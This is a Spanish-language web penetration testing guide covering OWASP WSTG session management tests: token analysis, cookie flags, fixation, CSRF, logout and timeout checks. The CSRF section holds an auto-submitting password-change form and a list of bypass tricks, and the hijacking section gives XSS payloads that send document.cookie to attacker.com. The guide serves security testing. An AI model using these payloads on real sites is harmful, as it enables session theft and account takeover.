# 4.6 Session Management Testing (WSTG-SESS)

## WSTG-SESS-01: Session Management Schema

### Análisis del Token de Sesión
```bash
# 1. Recopilar múltiples tokens (mismos usuario, distintas sesiones)
# 2. Analizar entropía y predecibilidad
# Herramientas: Burp Sequencer (capturar tokens → análisis estadístico)

# Decodificar token:
echo "dXNlcm5hbWU6MTYwMDAwMDAwMA==" | base64 -d
# Si contiene username o timestamp → predecible

# Analizar estructura JWT:
python3 -c "
import base64, json
token = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.xxx'
parts = token.split('.')
for p in parts[:2]:
    try: print(json.loads(base64.b64decode(p + '==')))
    except: pass
"
```

### Verificaciones del Token
- [ ] Longitud suficiente (≥128 bits de entropía)
- [ ] No predecible (no contiene datos de usuario, timestamps)
- [ ] Generado con CSPRNG
- [ ] Cambia después de login (previene session fixation)
- [ ] Cambia después de cambio de privilegios

---

## WSTG-SESS-02: Cookie Attributes

### Flags de Seguridad
```bash
curl -I https://target.com/login | grep -i "set-cookie"
# Analizar cada cookie:
# Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Domain=target.com

# Flags requeridos:
# HttpOnly → previene acceso desde JavaScript (XSS)
# Secure → solo se envía sobre HTTPS
# SameSite=Strict o Lax → previene CSRF

# Verificar:
# - ¿Falta HttpOnly? → XSS puede robar cookie
# - ¿Falta Secure? → cookie enviada en HTTP
# - ¿Falta SameSite? → posible CSRF
# - ¿Domain muy amplio? → .target.com en vez de target.com
# - ¿Path demasiado permisivo? → / en vez de /app/
```

---

## WSTG-SESS-03: Session Fixation

### Test
```bash
# 1. Obtener session ID sin autenticar:
curl -c cookies.txt https://target.com/login
cat cookies.txt  # anotar SESSIONID=PREAUTH_VALUE

# 2. Iniciar sesión con ese cookie forzado:
curl -b "SESSIONID=PREAUTH_VALUE" -X POST https://target.com/login \
  -d "username=user&password=pass"

# 3. Si después del login el SESSIONID es el mismo → Session Fixation

# Vector de ataque real:
# https://target.com/login?SESSIONID=attacker_chosen_value
# Si la app acepta sesión por GET y no regenera → vulnerable
```

---

## WSTG-SESS-04: Exposed Session Variables

```bash
# Verificar que Session ID NO aparezca en:
# - URL (query string): https://target.com/app?JSESSIONID=xxx
# - Logs del servidor
# - Referrer header
# - HTML source

# Probar si la sesión puede pasarse por URL (GET):
https://target.com/dashboard?session=abc123  # si funciona → riesgo
```

---

## WSTG-SESS-05: Cross-Site Request Forgery (CSRF)

### Detección
```bash
# 1. Identificar operaciones sensibles con cambios de estado (POST/PUT/DELETE)
# 2. Verificar presencia de token anti-CSRF:
#    <input type="hidden" name="csrf_token" value="random_value">
#    Header: X-CSRF-Token: <valor>
# 3. Si NO hay token → probar CSRF

# Verificar que token sea:
# - Único por sesión
# - Ligado al usuario
# - No predecible
# - Validado en el servidor

# Prueba manual: enviar request sin token y verificar que sea rechazada
curl -X POST https://target.com/change-email \
  -H "Cookie: session=valid_session" \
  -d "email=attacker@evil.com"
# Si tiene éxito sin token → CSRF
```

### PoC HTML para CSRF
```html
<html>
<body onload="document.forms[0].submit()">
<form action="https://target.com/change-password" method="POST">
  <input type="hidden" name="password" value="hacked123">
  <input type="hidden" name="confirm_password" value="hacked123">
</form>
</body>
</html>
```

### Bypass de Protecciones CSRF
```bash
# SameSite=None sin Secure → bypass en HTTP
# Token en cookie (en vez de body) → doble cookie bypass
# Mismo token para todos los usuarios → trivial bypass
# Token en header pero app también acepta sin header → bypass
# Subdomain XSS para leer token → bypass si SameSite=Lax
# Cambiar Content-Type a text/plain → bypass si app acepta ambos
```

---

## WSTG-SESS-06: Logout Functionality

```bash
# 1. Iniciar sesión
# 2. Hacer logout
# 3. Intentar usar el session token anterior:
curl -b "session=OLD_TOKEN" https://target.com/dashboard
# Si funciona → token no invalidado en servidor

# Verificar también:
# - Logout limpia cookie en cliente (Set-Cookie: session=; Max-Age=0)
# - Logout funciona en todos los dispositivos (si hay multi-sesión)
```

---

## WSTG-SESS-07: Session Timeout

```bash
# 1. Iniciar sesión
# 2. No hacer nada por el tiempo de timeout esperado (ej. 30 min)
# 3. Intentar usar la sesión:
curl -b "session=OLD_TOKEN" https://target.com/dashboard
# Debe devolver 401 o redirect a login

# Verificar timeout de inactividad vs absoluto
```

---

## WSTG-SESS-09: Session Hijacking

### Técnicas de Robo de Sesión
- **XSS**: `document.cookie` → enviar a servidor atacante
- **Network sniffing**: si cookie sin `Secure` flag
- **Log injection**: sesión en URLs logueadas
- **Subdomain**: si `Domain=.target.com`, subdomain puede leer cookie

### Fijación de Sesión como Hijacking
```javascript
// XSS payload para robar cookies
<script>
document.location='https://attacker.com/steal?c='+document.cookie;
</script>

// O con fetch (más silencioso)
<script>fetch('https://attacker.com/steal?c='+btoa(document.cookie))</script>
```

---

## WSTG-SESS-08: Session Puzzling (Overloading)

```bash
# Verificar si la misma variable de sesión se usa para múltiples propósitos
# Ejemplo: $_SESSION['user'] usado tanto para autenticación como para datos temporales
# Si el flujo A permite establecer una variable que el flujo B usa para autenticar
# → Session Puzzling / Session Variable Overloading
```
